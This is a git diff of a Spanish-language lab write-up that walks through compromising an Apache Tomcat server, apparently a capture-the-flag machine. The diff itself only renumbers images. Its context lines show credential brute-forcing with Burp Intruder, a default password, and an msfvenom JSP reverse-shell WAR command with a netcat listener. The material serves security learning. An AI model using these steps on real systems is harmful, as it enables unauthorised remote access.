@@ -6,11 +6,11 @@
 nmap -T4 -p- -A -sS 10.10.10.4
 ```
 
-![](../../.gitbook/assets/imagen%20%28552%29.png)
+![](../../.gitbook/assets/imagen%20%28554%29.png)
 
 Tenemos un **apache tomacat default page**.
 
-![](../../.gitbook/assets/imagen%20%28550%29.png)
+![](../../.gitbook/assets/imagen%20%28551%29.png)
 
 
 
@@ -52,23 +52,23 @@ Vamos a proxy -&gt; opciones vemos la ip
 
 Lo ponemos como proxy de firefox
 
-![](../../.gitbook/assets/imagen%20%28548%29.png)
+![](../../.gitbook/assets/imagen%20%28549%29.png)
 
 #### Enviando una default credential
 
 Al entrar al login probamos tomcat tomcat pero antes de enviarla probamos ver donde estan esos parametros. 
 
-![](../../.gitbook/assets/imagen%20%28554%29.png)
+![](../../.gitbook/assets/imagen%20%28556%29.png)
 
 Bien el problema aqui es que aparece como Basic: y algo encriptado \(en la ultima linea\), para esto lo enviamos al decoder. En el decoder lo podemos cambiar a base64 y verlos en plain text
 
-![Resultado](../../.gitbook/assets/imagen%20%28547%29.png)
+![Resultado](../../.gitbook/assets/imagen%20%28548%29.png)
 
 No hubo suerte con el anterior.
 
 Hacemos **gedit** con las contraseñas y usuarios por defecto, reemplazamos \(cntl h\) el espacio en el medio por un **:** ya que es el formato por defecto que vimos.
 
-![](../../.gitbook/assets/imagen%20%28553%29.png)
+![](../../.gitbook/assets/imagen%20%28555%29.png)
 
 Hacemos un bash script para pasar eso todo a base64
 
@@ -78,15 +78,15 @@ for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
 
 Back al burpsuit, desde ahi ponemos el modo intruder en sniper. Seleccionamos el archivo en base64 y desde payloads le cargamos los hashes.
 
-![](../../.gitbook/assets/imagen%20%28557%29.png)
+![](../../.gitbook/assets/imagen%20%28559%29.png)
 
 Pasandole el payload llegamos al correcto, decodificandola era **tomcat:s3cret**
 
-![](../../.gitbook/assets/imagen%20%28556%29.png)
+![](../../.gitbook/assets/imagen%20%28558%29.png)
 
 ### **Inside tomcat**
 
-![](../../.gitbook/assets/imagen%20%28551%29.png)
+![](../../.gitbook/assets/imagen%20%28552%29.png)
 
 Vemos que maneja los archivos WAR, podemos subir alguno, probemos uno malicioso de google.
 
@@ -98,9 +98,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port 
 
 Usaremos netcat para escuchar la entrada del reverse shell
 
-![](../../.gitbook/assets/imagen%20%28549%29.png)
+![](../../.gitbook/assets/imagen%20%28550%29.png)
 
-![](../../.gitbook/assets/imagen%20%28555%29.png)
+![](../../.gitbook/assets/imagen%20%28557%29.png)
 
 
 
